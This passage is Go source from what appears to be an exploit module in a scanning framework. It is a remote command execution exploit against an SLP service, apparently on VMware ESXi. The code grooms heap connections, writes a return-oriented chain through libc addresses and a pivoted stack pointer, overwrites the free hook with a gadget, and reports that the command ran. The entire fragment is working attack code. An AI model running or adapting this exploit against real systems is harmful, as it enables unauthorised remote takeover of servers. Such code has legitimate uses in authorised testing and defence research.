			con40, err := getConnect(target)
			if err != nil {
				return expResult
			}
			// con40 block
			_, err = sendMessagejzd542(con40, block(0x178))
			if err != nil {
				return expResult
			}
			payload := append([]byte(cmd), 0x00)
			// con36 updateTargetRecvBuffer
			_, err = sendMessagejzd542(con36, updateTargetRecvBuffer(len(payload), shellCmdAddress))
			if err != nil {
				return expResult
			}
			// con35 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con35, updateTargetSlpdsocket(0x1a, 0x140, 0x6c))
			if err != nil {
				return expResult
			}
			// con33 generateSrvRqst
			_, err = sendMessagejzd542(con33, generateSrvRqst(payload))
			if err != nil {
				return expResult
			}
			var tmp bytes.Buffer
			for i := 0; i < 10; i++ {
				binary.Write(&tmp, binary.LittleEndian, libcRetAddress)
			}
			binary.Write(&tmp, binary.LittleEndian, libcSystemAddress)
			padding := bytes.Repeat([]byte{'A'}, 4)
			tmp.Write(padding)
			binary.Write(&tmp, binary.LittleEndian, shellCmdAddress)
			payload = tmp.Bytes()
			// con36 updateTargetRecvBuffer
			_, err = sendMessagejzd542(con36, updateTargetRecvBuffer(len(payload), int(pivotedEspValue-0x10)))
			if err != nil {
				return expResult
			}
			// con35 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con35, updateTargetSlpdsocket(0x1a, 0x140, 0x6c))
			if err != nil {
				return expResult
			}
			// con33 generateSrvRqst
			_, err = sendMessagejzd542(con33, generateSrvRqst(payload))
			if err != nil {
				return expResult
			}
			payload = make([]byte, 4)
			binary.LittleEndian.PutUint32(payload, uint32(gadgetAddress))
			// con36
			_, err = sendMessagejzd542(con36, updateTargetRecvBuffer(len(payload), int(libcFreeHookAddress)))
			if err != nil {
				return expResult
			}
			// con35 updateTargetSlpdsocket
			_, err = sendMessagejzd542(con35, updateTargetSlpdsocket(0x1a, 0x140, 0x6c))
			if err != nil {
				return expResult
			}
			// con33 generateSrvRqst
			_, err = sendMessagejzd542(con33, generateSrvRqst(payload))
			if err != nil {
				return expResult
			}
			expResult.Success = true
			expResult.Output = "命令执行成功"
			return expResult
		},
	))
}
